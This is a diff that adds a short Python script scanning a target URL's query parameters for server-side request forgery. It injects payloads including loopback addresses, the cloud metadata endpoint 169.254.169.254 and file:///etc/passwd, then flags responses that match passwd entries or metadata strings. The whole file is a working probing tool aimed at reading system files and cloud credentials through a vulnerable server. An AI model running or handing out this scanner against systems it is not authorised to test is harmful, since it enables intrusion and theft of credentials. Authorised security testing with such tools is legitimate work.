@@ -1,0 +1,47 @@
+import requests
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+# Common SSRF payloads
+ssrf_payloads = [
+    "http://127.0.0.1",
+    "http://169.254.169.254",  # AWS metadata
+    "http://localhost",
+    "http://0.0.0.0",
+    "http://[::1]",
+    "file:///etc/passwd"
+]
+
+def is_suspected_ssrf(response_text):
+    ssrf_indicators = [
+        r"root:x:0:0:",               # /etc/passwd
+        r"EC2Metadata",               # AWS metadata mention
+        r"localhost", r"127\.0\.0\.1"
+    ]
+    for pattern in ssrf_indicators:
+        if re.search(pattern, response_text, re.IGNORECASE):
+            return True
+    return False
+
+def check_ssrf(url):
+    parsed = urlparse(url)
+    original_params = parse_qs(parsed.query)
+
+    for param in original_params:
+        for payload in ssrf_payloads:
+            new_params = original_params.copy()
+            new_params[param] = payload
+            new_query = urlencode(new_params, doseq=True)
+            new_url = urlunparse(parsed._replace(query=new_query))
+
+            print(f"[*] Testing: {new_url}")
+            try:
+                r = requests.get(new_url, timeout=5)
+                if is_suspected_ssrf(r.text):
+                    print(f"[!!] Possible SSRF vulnerability on param: {param} with payload: {payload}")
+            except Exception as e:
+                print(f"[ERROR] Request failed: {e}")
+
+if __name__ == "__main__":
+    import re
+    target = input("Enter the target URL with parameter (e.g. http://example.com/page?url=test): ")
+    check_ssrf(target)
